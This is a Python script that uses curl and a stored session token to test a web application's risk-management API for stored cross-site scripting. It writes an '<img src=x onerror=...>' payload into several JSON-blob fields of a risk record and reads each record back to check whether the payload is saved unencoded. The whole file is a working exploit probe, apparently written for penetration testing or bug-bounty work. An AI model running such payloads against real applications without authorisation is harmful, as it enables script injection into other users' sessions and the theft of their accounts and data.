import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXJ'+uuid.uuid4().hex[:5]
PAY=f'<img src=x onerror=alert(document.domain)>{tag}'
print("=== JSON-blob fields on risks: do they skip the encoder? ===")
# risk 1 has custom_json1, formula_data, field_data per earlier read
for f in ['custom_json1','formula_data','field_data','reference_meta']:
    body={"risk":{f:{"zx":PAY}}}
    c,b=req('PUT','/api/v1/risks/1',body)
    c2,b2=req('GET','/api/v1/risks/1')
    st=None
    try: st=json.loads(b2)['risks'][0].get(f)
    except: pass
    raw = PAY in json.dumps(st) if st else False
    print(f"  {f:16} PUT={c}  stored={json.dumps(st)[:110]}")
    print(f"                   RAW_STORED={raw}")
